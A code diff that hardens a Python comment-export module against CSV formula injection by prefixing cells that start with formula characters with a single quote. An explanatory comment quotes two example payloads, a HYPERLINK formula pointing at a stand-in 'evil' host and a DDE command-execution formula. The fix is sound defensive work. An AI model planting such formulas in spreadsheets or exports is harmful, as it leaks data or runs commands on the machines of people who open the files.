@@ -4,7 +4,7 @@ import csv
 import io
 import json
 import logging
-from typing import Dict, List
+from typing import Any, Dict, List
 
 from .exceptions import ReviewEngineError
 
@@ -35,6 +35,22 @@ def _export_json(comments: List[Dict]) -> str:
     return json.dumps(comments, ensure_ascii=False, indent=2)
 
 
+# Round-15.5: Excel/Numbers/LibreOffice treat a cell whose first char is
+# one of =, +, -, @, TAB, CR as a formula and execute it when the user
+# opens the CSV. A malicious comment body like "=HYPERLINK(\"http://evil\",\"x\")"
+# or "=cmd|'/c calc'!A1" (DDE) can exfiltrate session data or trigger
+# command execution when the exported report is opened by a reviewer.
+# Prefix dangerous cells with a single-quote — the standard OWASP fix.
+_CSV_FORMULA_SENTINELS = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _csv_escape(value: Any) -> str:
+    s = "" if value is None else str(value)
+    if s and s[0] in _CSV_FORMULA_SENTINELS:
+        return "'" + s
+    return s
+
+
 def _export_csv(comments: List[Dict]) -> str:
     output = io.StringIO()
     writer = csv.writer(output)
@@ -44,10 +60,10 @@ def _export_csv(comments: List[Dict]) -> str:
         tc = _ms_to_timecode(c.get("time_start_ms", 0))
         writer.writerow([
             tc,
-            c.get("type", ""),
-            c.get("text", ""),
-            c.get("status", "pending"),
-            c.get("ai_reply", ""),
+            _csv_escape(c.get("type", "")),
+            _csv_escape(c.get("text", "")),
+            _csv_escape(c.get("status", "pending")),
+            _csv_escape(c.get("ai_reply", "")),
         ])
 
     return output.getvalue()
